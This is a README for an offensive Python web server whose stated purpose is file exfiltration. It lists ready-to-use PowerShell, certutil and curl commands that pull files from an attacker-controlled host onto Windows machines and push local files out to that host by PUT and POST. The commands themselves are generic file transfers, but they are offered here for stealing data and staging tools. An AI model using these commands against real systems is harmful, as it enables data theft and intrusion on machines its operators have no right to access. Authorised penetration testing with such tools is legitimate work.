# offensivewebserver
A simple Python web server that is case-insensitive and allows file uploads via POST and PUT methods to facilitate exfiltration.

# USE
run the script in your desired location with optional `--port` parameter. The default port is 443.

`ofensivewebserver [--port <PORT>]`

# DOWNLOAD METHODS
## Windows

```powershell
Invoke-WebRequest -Uri "http://<SERVER_IP>:<PORT>/<FILENAME>" -OutFile "<FILENAME_AT_DESTINATION>"
Invoke-RestMethod -Uri "http://<SERVER_IP>:<PORT>/<FILENAME>" -OutFile "<FILENAME_AT_DESTINATION>"
```

```
certutil -urlcache -split -f http://<SERVER_IP>:<PORT>/<FILENAME> <FILENAME_AT_DESTINATION>
```

# UPLOAD METHODS (EXFILTRATION)

## Windows

**BY METHOD PUT**
```powershell
Invoke-RestMethod -Uri http://<SERVER_IP>:<PORT>/<FILENAME_AT_DESTINATION> -Method Put -InFile "<FILE_TO_UPLOAD>"
```

**BY METHOD POST**
```powershell
 `Invoke-RestMethod -Uri http://<SERVER_IP>:<PORT> -Method Post -Headers @{ "File-Name" = "<FILENAME_AT_DESTINATION>" } -InFile "<FILE_TO_UPLOAD>"
```

## Linux

**BY METHOD PUT**
```bash
curl -T <FILE_TO_UPLOAD> http://<SERVER_IP>:<PORT>/<FILENAME_AT_DESTINATION>
```

**BY METHOD POST**
```bash
curl -X POST -H "File-Name: <FILENAME_AT_DESTINATION>" --data-binary @<FILE_TO_UPLOAD> http://<SERVER_IP>:<PORT>
```

# Final Words
Credits to the user Kremp from the F95Zone forum, who provided the base code that I adapted slightly. The original source code can be found at: https://f95zone.to/threads/small-python-script-to-run-local-case-insensitive-web-server.189695/

